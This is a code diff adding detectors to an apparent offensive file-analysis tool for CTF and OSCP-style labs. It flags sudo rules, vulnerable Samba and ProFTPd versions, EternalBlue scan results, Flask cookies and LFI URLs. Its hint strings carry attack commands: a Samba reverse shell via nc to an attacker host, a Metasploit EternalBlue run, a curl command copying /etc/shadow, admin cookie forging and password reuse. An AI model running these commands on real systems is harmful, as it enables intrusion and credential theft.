@@ -507,6 +507,45 @@ _AD = [
     ("Consul ACL token", re.compile(
         r'(?i)\b(?:CONSUL_HTTP_TOKEN|consul_token|acl\.tokens\.\w+)\s*[:=]\s*["\']?'
         r'([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})["\']?')),
+    # ---- iter-17: deep-corpus-mine gaps (workflow wkl2kkzn5) ----
+    # sudo -l output line (distinct from /etc/sudoers - no user/host prefix):
+    #     (root) NOPASSWD: /usr/bin/find
+    # Triple-CRITICAL gap in the mine: missed every PEAS / linPEAS / sudo-l
+    # cap in HTB Lame/Nibbles/THM Common-Linux-Privesc etc.
+    ("sudo -l NOPASSWD", re.compile(
+        r'(?im)^\s+\(([^)\r\n]{1,80})\)\s+(?:NOPASSWD|SETENV)\s*:\s*'
+        r'(/\S[^\r\n]{0,200})')),
+    # HTB Lame / smbclient / enum4linux Samba banner (CVE-2007-2447 range):
+    #     Server=[Samba 3.0.20-Debian]
+    ("Samba vuln banner", re.compile(
+        r'(?i)Server\s*=\s*\[\s*Samba\s+(3\.0\.(?:[0-9]|1[0-9]|2[0-5])'
+        r'(?:[.\-][\w.-]*)?)\s*\]')),
+    # HTB Blocky-style Java/C#/JS typed field secret:
+    #     public String sqlPass = "FakeBlockyPass2024!";
+    ("Java field secret", re.compile(
+        r'(?:public|private|protected|static|final|var|let|const|String|str)\s+'
+        r'(?:public|private|protected|static|final|String|str|var|let|const|\s)*'
+        r'([A-Za-z_]\w*(?:Pass|Password|Passwd|Pwd|Passphrase|Secret))\s*=\s*'
+        r'["\']([^"\'\r\n]{3,})["\']', re.IGNORECASE)),
+    # linPEAS bracketed-CVE line: `[+] [CVE-2021-4034] PwnKit`
+    # Existing PEAS finding regex required unbracketed CVE token.
+    ("PEAS bracketed CVE", re.compile(
+        r'(?i)\[(?:[+!*])\]\s+\[?CVE-\d{4}-\d{2,7}\]?[^\r\n]{0,200}')),
+    # Flask / itsdangerous session cookie (.eJw... zlib-prefix shape)
+    ("Flask itsdangerous", re.compile(
+        r'(?:^|[\s=;\'"])'
+        r'(\.eJ[A-Za-z0-9_\-]{15,}\.[A-Za-z0-9_\-]{6,12}\.[A-Za-z0-9_\-]{20,})'
+        r'(?=[\s;\'"]|$)')),
+    # nmap NSE smb-vuln-* / ProFTPd CPFR/CPTO are multi-line - handled in
+    # _multiline_passes() below (per-line _AD loop can't see across lines).
+    # Steghide info / extract output (rijndael fingerprint is unique)
+    ("Steghide artifact", re.compile(
+        r'(?im)^\s*encrypted\s*:\s*rijndael-(?:128|192|256),\s*(?:cbc|ecb)\b')),
+    # PHP wrapper LFI URL (php://filter/convert.base64-encode/resource=...)
+    ("PHP wrapper LFI", re.compile(
+        r'(?i)\b(?:php://(?:filter|input|expect)/[^\s\'"<>]{1,300}|'
+        r'expect://[^\s\'"<>]{1,80}|phar://[^\s\'"<>]{1,200}|'
+        r'data://text/plain(?:;base64)?,[^\s\'"<>]{1,300})')),
 ]
 
 
@@ -1022,6 +1061,34 @@ def _multiline_passes(path, report, store):
                 store.add(Evidence(kind="plaintext", plaintext=val,
                                    source=path, line=_ln(m)))
 
+    # iter-17 (corpus mine wkl2kkzn5): nmap NSE smb-vuln-* output block
+    # (HTB Blue / TryHackMe Blue EternalBlue). The script header + multi-line
+    # body + State:VULNERABLE need file-scope context.
+    if not filters.is_doc_file(path):
+        _NMAP_SMB_VULN = re.compile(
+            r'(?im)\|\s*(smb2?-vuln-[a-z0-9\-]+)\s*:[^\r\n]*\r?\n'
+            r'(?:\|[^\r\n]*\r?\n){0,15}?\|[^\r\n]*\bState\s*:\s*VULNERABLE\b')
+        for m in _NMAP_SMB_VULN.finditer(text):
+            script_id = m.group(1)
+            report.add("CRITICAL", "RECON", path, _ln(m),
+                       f"nmap {script_id}: VULNERABLE",
+                       hint=("OSCP+ allows manual single-target Metasploit: "
+                             "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; "
+                             "set RHOSTS <ip>; set LHOST <you>; run'  OR  public PoC: "
+                             "worawit/MS17-010 send_and_execute.py <ip> <smbexe>"))
+
+        # iter-17: ProFTPd mod_copy CPFR/CPTO (CVE-2015-3306, HTB Kenobi)
+        _PROFTPD = re.compile(
+            r'(?im)^\s*(?:ftp>\s+)?SITE\s+CPFR\s+(/\S+)[\s\S]{0,400}?'
+            r'^\s*(?:ftp>\s+)?SITE\s+CPTO\s+(/\S+)')
+        for m in _PROFTPD.finditer(text):
+            src_p, dst_p = m.group(1), m.group(2)
+            report.add("CRITICAL", "INTERESTING FILES", path, _ln(m),
+                       f"ProFTPd mod_copy: CPFR {src_p} -> CPTO {dst_p}",
+                       hint=("CVE-2015-3306 pre-auth arb-file-read: "
+                             "curl -s ftp://anonymous@<ip>/ --quote 'SITE CPFR /etc/shadow' "
+                             "--quote 'SITE CPTO /var/tmp/x'; then GET /var/tmp/x via FTP/HTTP"))
+
     # iter-11: Pidgin accounts.xml plaintext password block (multi-line XML)
     _PIDGIN = re.compile(
         r'(?is)<account>\s*<protocol>([a-z\-]{3,30})</protocol>\s*'
@@ -1413,6 +1480,100 @@ def analyze(path, report, store=None):
                         report.add("CRITICAL", "ASSIGNED SECRETS", path, lineno,
                                    f"sudoers NOPASSWD  {user}  ->  {cmd[:80]}",
                                    hint=f"as '{user}' run: sudo {cmd.split()[0] if cmd else '<cmd>'}  (check GTFOBins for escape)")
+                        hit = True
+                        break
+                    # iter-17 (corpus mine wkl2kkzn5): sudo -l output shape
+                    # (no user/host prefix; indented '(runas) NOPASSWD: /path').
+                    # Gate to plausibly-sudo-l files to skip code/doc FPs.
+                    if name == "sudo -l NOPASSWD":
+                        runas, cmd = am.group(1), am.group(2).strip()
+                        base = os.path.basename(path).lower()
+                        plow = path.lower()
+                        if not ("sudo" in base or "priv" in base or "peas" in plow
+                                or "linpeas" in plow or path.lower().endswith((".txt", ".log", ".md"))):
+                            continue
+                        if filters.is_doc_file(path):
+                            continue
+                        bin_path = cmd.split()[0] if cmd else "<cmd>"
+                        report.add("CRITICAL", "ASSIGNED SECRETS", path, lineno,
+                                   f"sudo -l NOPASSWD (as {runas}) -> {cmd[:80]}",
+                                   hint=(f"sudo {bin_path}  "
+                                         f"(gtfobins.github.io/gtfobins/{os.path.basename(bin_path)} - Sudo section)"))
+                        hit = True
+                        break
+                    # iter-17: Samba CVE-2007-2447 banner (HTB Lame)
+                    if name == "Samba vuln banner":
+                        if filters.is_doc_file(path):
+                            continue
+                        ver = am.group(1)
+                        report.add("CRITICAL", "RECON", path, lineno,
+                                   f"Samba {ver} - CVE-2007-2447 username map script RCE",
+                                   hint=("manual: smbclient //<host>/notashare -U '/=`nc <you> 4444 -e /bin/sh`'  "
+                                         "(spawns reverse shell as root; spoofing-free)"))
+                        hit = True
+                        break
+                    # iter-17: Java/C#/JS typed field secret (HTB Blocky)
+                    if name == "Java field secret":
+                        field, val = am.group(1), am.group(2)
+                        if (not val or filters.is_placeholder(val)
+                                or filters.is_known_example(val)
+                                or filters.is_code_not_literal(val, line)):
+                            continue
+                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
+                                   f"{field}: {val}",
+                                   hint=("decompiled/source field literal - reuse against the service "
+                                         "the class talks to (DB/LDAP/HTTP) and try same pw for OS users "
+                                         "(SSH/SMB) on the same box"))
+                        if store is not None:
+                            from analyzers.ingest.evidence import Evidence
+                            store.add(Evidence(kind="plaintext", plaintext=val,
+                                               source=path, line=lineno))
+                        hit = True
+                        break
+                    # iter-17: linPEAS bracketed-CVE finding
+                    if name == "PEAS bracketed CVE":
+                        if filters.is_doc_file(path):
+                            continue
+                        cve_match = re.search(r'CVE-\d{4}-\d{2,7}', line)
+                        cve = cve_match.group(0) if cve_match else "CVE-?"
+                        report.add("HIGH", "RECON", path, lineno,
+                                   f"linPEAS CVE highlight: {cve}",
+                                   hint=f"searchsploit {cve}; verify version on host; if exam-legal PoC exists, manual exploitation only")
+                        hit = True
+                        break
+                    # iter-17: Flask itsdangerous session cookie
+                    if name == "Flask itsdangerous":
+                        if filters.is_doc_file(path):
+                            continue
+                        tok = am.group(1)
+                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
+                                   f"Flask session: {tok[:30]}...",
+                                   hint=("flask-unsign --decode --cookie '<value>'; "
+                                         "if SECRET_KEY known: flask-unsign --sign --cookie \"{'user':'admin'}\" --secret '<key>'"))
+                        hit = True
+                        break
+                    # iter-17: nmap NSE smb-vuln + ProFTPd CPFR/CPTO are
+                    # multi-line; dispatched from _multiline_passes() below.
+                    # iter-17: Steghide artifact (rijndael fingerprint)
+                    if name == "Steghide artifact":
+                        if filters.is_doc_file(path):
+                            continue
+                        report.add("MEDIUM", "INTERESTING FILES", path, lineno,
+                                   "Steghide artifact (rijndael-CBC payload)",
+                                   hint=("steghide info <carrier>; steghide extract -sf <carrier> -p '<pass>'  "
+                                         "(passphrase often in nearby notes; sweep: stegseek <jpg> rockyou.txt)"))
+                        hit = True
+                        break
+                    # iter-17: PHP wrapper LFI URL
+                    if name == "PHP wrapper LFI":
+                        if filters.is_doc_file(path):
+                            continue
+                        wrapper = am.group(0)
+                        report.add("HIGH", "RECON", path, lineno,
+                                   f"PHP wrapper LFI: {wrapper[:80]}",
+                                   hint=("LFI/SSRF wrapper - response body is b64-encoded SOURCE of the resource "
+                                         "param; decode: curl ... | base64 -d   |  also try "
+                                         "/etc/passwd, /var/www/html/config.php, /proc/self/environ"))
                         hit = True
                         break
                     if name == "cron script ref":
